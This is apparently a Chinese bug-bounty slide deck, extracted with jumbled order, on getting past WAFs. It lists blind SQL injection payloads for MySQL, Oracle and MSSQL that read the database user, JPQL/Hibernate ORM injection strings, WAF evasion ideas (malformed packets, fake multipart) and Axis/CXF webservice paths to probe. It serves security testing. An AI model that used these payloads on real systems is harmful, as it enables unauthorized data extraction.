众测困住你的那些问题
jkgh006 | 众测资深玩家，多家众测平台TOP白帽
前 言
      安全趋势的发展，现在已经变成三大阵容，一个是代表过去的传统漏洞平台，第二个是以乙方为
首的众测平台，以及以甲方主导的SRC平台 ，  传统的漏洞平台慢慢的淡出视野，现在最火的莫过于
SRC和众测，所有的类型终将归为一种方法，所以对于其中众测也是有一套方法论，怎么分析，怎
么去绕，怎么去获取证据，等等都是有章可循，我们重点关注众测困住你的那些问题。
目录 
01
拦截框架下注入的过程拆解
02
基于三方调用框架分析利用
03
趣味的SESSION和EXCEL
01
拦截框架下注入的过程拆解
越来越多的web系统，随着运维方安全意识的提高，网络设备的投入，
以及安全编码规范的介入，漏洞的发现从过去的简单粗暴，到现在举步
维艰，怎么去判断漏洞的存在，进而根据漏洞获取证据数据，这个是个
众测平台选手的痛点
1
拦截框架下注入的过程拆解
1.WAF产品的原理
2.全局过WAF的几个思考点
3.漏洞层面的过WAF
层层递进分析WAF求证据
1.判断性SQL语句的形式
2.条件判断函数方法分析
3.通用型判断SQL语句对比
数据库层面基础铺垫
1.基于JPQL类型的绕过分析
2.基于Hibernate类型的绕过分析
框架层的语句分析
if(1=(select 1 REGEXP if(1=1,1,0x00)),1,1)=1
IFNULL(ascii(substr(user(),1,1))/(114%ascii(substr
(user(),1,1))),'yes’)
IFNULL(hex(substr(user(),1,1))/(114%hex(substr(u
ser(),1,1))),'yes’)
IFNULL(1/(locate(substr(user(),1,1),'r')),'yes’)
IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),'
yes’)
left(user(),1)="r";
if(1=1,1,1)
NVL(TO_CHAR(DBMS_XMLGEN.getxml('sele
ct 1 from dual where 1337>1')),'1')!=1
NVL2(NULLIF(substr('abc',1,1),'ca'),1,2)=1
INSTR('abcd','b', 2, 1)>0
2018-10-21’-
decode(1,21,1,to_date(decode(1,1,'','s'),'yyyy
-mm-dd'))-’
to_date(decode(substr(user,1,1),'a','','s'),'yyy
y-mm-dd’))
decode(sign(INSTR(USER,'A', 2, 
1)),0,to_number('x'),1)
PATINDEX('Wa%25', 'Washington')>0
right(left(lower('abc'),1),1)='a’
isnull(nullif(substring('abc',1,1),'a'),'c')='c'
regexp_like(1,(case when 1=1 then 1 else 0x00 
end))
1
数据库层面基础铺垫-条件判断函数方法分析
云模式只需将网
站的DNS解析到
WEB防火墙，就
可以开始服务
Web防火墙
从waf的拦截机理我们可以分
为两种模式的绕过：
1.全局性质的绕过
2.漏洞从面的绕过
1
层层递进分析WAF求证据-WAF产品的原理
（a.畸形包绕过，b.正向数据绕过）
1.从原理上讲数据流过waf，也就是经过网络设备，再到后台的
web容器，这里面存在很多兼容差问题，比如国内传统的waf，
网络层解析通过nginx做的，如果web部署在weblogic，或者
tomcat上，因为后者都有容错性处理，所以可以解析畸形包，
但是在nginx曾解析不了，从而放过处理，达到全局绕过
2.所谓正向数据，就是说数据包本身是一个正常的，没有进行畸
形构造，是过了waf的黑白名单等配置型漏洞，如果，
HTTP/1.0，再比如构造假multipart数据配合GET绕过阿里云等
等
1
层层递进分析WAF求证据-全局过WAF的几个思考点
ORM注入
数字类型（ JPQL ）：
SELECT e FROM user e WHERE e.id = SQL('(select 1 from 
dual where 1=1)’) and SQL('(SELECT 1)=1’)
字符类型（JPQL）：
通常指的是类似hibernate一类具有安全语法检测的注入
1
框架层的语句分析-基于JPQL类型的绕过分析
ORM注入
数字类型（ Hibernate ORM ）：
test\'' or 1
    CXFServlet  
    org.apache.cxf.transport.servlet.CXFServlet
    1
    CXFServlet
    /webservice/*
XFireServlet
/servlet/XFireServlet/*
XFireServlet
/services/*
    AxisServlet
    /servlet/AxisServlet
    AxisServlet
    *.jws
    AxisServlet
    /service/*
    AxisServlet
    /services/*
    SOAPMonitorService
    /SOAPMonitor
    AxisServlet
        org.apache.axis.transport.http.AxisServlet
    AxisServlet
    /services/*
2
基于三方调用框架分析利用-WEBSERVICE接口
Jws文件审计
1. 在web目录全局查找jws结尾的文件
2. 根据对应的web访问目录通过浏览器进行访问
3. 对其相应的接口进行审计
通常而言jws文件也是axis2发布的一种表现形式，然后更多的被
审计人员忽略
2